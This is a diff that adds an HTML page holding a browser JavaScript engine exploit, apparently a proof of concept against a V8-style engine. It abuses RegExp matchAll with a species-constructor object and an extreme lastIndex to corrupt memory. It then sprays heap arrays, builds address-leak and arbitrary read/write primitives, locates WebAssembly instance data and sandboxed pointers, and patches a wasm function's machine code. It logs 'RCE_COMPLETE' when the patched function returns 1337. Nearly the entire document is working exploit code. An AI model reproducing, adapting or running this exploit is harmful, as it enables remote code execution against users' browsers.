@@ -1,0 +1,108 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P66</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  function hr(a){const o=a-0x1080018;if(o<0||o>0x3FFFFFFE0)return 0n;try{return f2i(m[Math.floor(o/8)]);}catch(e){return 0n;}}
+  const cands=[];
+  for(let k=0x8000;k<0x10010;k++){
+    try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+    if(cands.length>=6)break;
+  }
+  let OB=-1;
+  for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    objB[4]=wasmI;const wA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    log("W:"+wA.toString(16));
+    // Read WasmInstance to get WasmTrustedInstanceData
+    const wR=wA&0xFFFFFFFE;
+    const wi1=hr(wR+8);const wi2=hr(wR+16);
+    const lo1=Number(wi1&0xffffffffn),hi1=Number(wi1>>32n);
+    const lo2=Number(wi2&0xffffffffn),hi2=Number(wi2>>32n);
+    // Pick WTID pointer (odd, >1M)
+    let wtid=0;
+    for(const v of [lo2,hi2,lo1,hi1]){if(v>0x1000000&&(v&1)){wtid=v&0xFFFFFFFE;break;}}
+    log("WTID:"+wtid.toString(16));
+    if(wtid>0){
+      // Read WTID fields to find SandboxedPointer (jump_table_start)
+      // Scan WTID QWORDs for values that decode to reasonable cage offsets
+      // kSandboxedPointerShift = 24
+      // decoded_offset = stored_value >> 24
+      // Valid if decoded_offset < 4GB (cage size)
+      for(let i=0;i<12;i++){
+        const v=hr(wtid+i*8);
+        if(v>0x100000000n){ // SandboxedPointers are >32-bit values
+          const decoded=Number(v>>24n);
+          if(decoded>0x1000&&decoded<0x100000000){ // within cage
+            log("SP"+i+":"+v.toString(16)+" -> cage+"+decoded.toString(16));
+            // Try reading wasm code at this offset!
+            const codeK=Math.floor((decoded-0x1080018)/8);
+            if(codeK>0&&codeK<MAXS){
+              try{
+                const code0=f2i(m[codeK]);
+                const code1=f2i(m[codeK+1]);
+                log("CODE:"+code0.toString(16)+","+code1.toString(16));
+                // Search for b8 2a 00 00 00 (mov eax, 42) in nearby QWORDs
+                for(let j=0;j<16;j++){
+                  const cv=f2i(m[codeK+j]);
+                  const b=[];for(let bi=0;bi<8;bi++)b.push(Number((cv>>BigInt(bi*8))&0xffn));
+                  for(let bi=0;bi<=3;bi++){
+                    if(b[bi]===0xb8&&b[bi+1]===0x2a&&b[bi+2]===0&&b[bi+3]===0&&(bi+4>=8||b[bi+4]===0)){
+                      log("FOUND_MOV42 q:"+j+" b:"+bi);
+                      // OVERWRITE: mov eax,1337 = b8 39 05 00 00
+                      let nv=cv;
+                      nv=(nv&~(0xffn<<BigInt((bi+1)*8)))|(0x39n<<BigInt((bi+1)*8));
+                      nv=(nv&~(0xffn<<BigInt((bi+2)*8)))|(0x05n<<BigInt((bi+2)*8));
+                      m[codeK+j]=i2f(nv);
+                      const newVal=wasmI.exports.f();
+                      log("NEW:"+newVal);
+                      if(newVal===1337)log("RCE_COMPLETE");
+                      break;
+                    }
+                  }
+                }
+              }catch(e){log("CODE_E:"+e.message);}
+            }
+            break; // only try first valid SP
+          }
+        }
+      }
+    }
+  }else{log("STALE");}
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
